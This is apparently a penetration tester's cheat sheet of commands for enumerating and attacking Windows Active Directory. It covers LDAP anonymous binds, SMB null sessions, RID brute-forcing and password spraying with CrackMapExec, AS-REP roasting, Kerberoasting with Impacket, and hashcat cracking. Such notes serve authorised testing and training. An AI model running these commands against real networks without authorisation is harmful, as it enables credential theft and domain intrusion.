# Windows technologies
Windows tech enumeration

# LDAP
## Look for anonymous binds
```bash
ldapsearch -H ldap://<ip>:<port> -b "dc=domain,dc=local" -x
```   
*Make sure to look for users in the Remote Management Users group*  

## Get users with
```bash
windapsearch.py --dc-ip <ip> -d domain.local -u "" -U
```
​
# SMB
## Enumeration

# smbmap
```bash
# Without creds
smbmap -H <ip>

# With cresd
smbmap -H <ip> -u <user> -p <password>
```

### CrackMapExec
```bash
# Enumerate users
crackmapexec smb <ip> -u <user> -p <password> --users

# Perform RID Bruteforce to get users
crackmapexec smb <ip> -u <user> -p <password> --rid-brute

# Enumerate domain groups
crackmapexec smb <ip> -u <user> -p <password> --groups

# Enumerate local users
crackmapexec smb <ip> -u <user> -p <password> --local-users
```

### enum4linux
```bash
enum4linux -U -o <ip>
```

### Null session attack
```bash
smbclient -N -L \\\\<ip>

crackmapexec smb <ip> -u ""
```

### Bruteforcing and password spraying
```bash
crackmapexec smb <ip> -u <username/file> -p <password/file>
```


# Kerberos
## GetNPUsers.py
Impacket's `GetNPUsers.py` will attempt to harvest the non-preauth AS_REP responses for a given list of usernames

### Usage
```bash
GetNPUsers.py domain.local/ -dc-ip <ip> -usersfile <username_file> -format hashcat -outputfile <output>
```

## Kerberoasting
Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name.

```bash
GetUserSPNs.py -request -dc-ip <ip> domain.local/user -save -outputfile <output_file>
```

### Cracking the ticket
```bash
hashcat -m 13100 --force <hash_file> <password_file>
```

#### References
- [https://www.crowdstrike.com/cybersecurity-101/kerberoasting/](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)

# RPC
# Enumeration
```bash
# Null authentication
rpcclient -U '' <ip>

# With creds
rpcclient -U <username> <ip>
```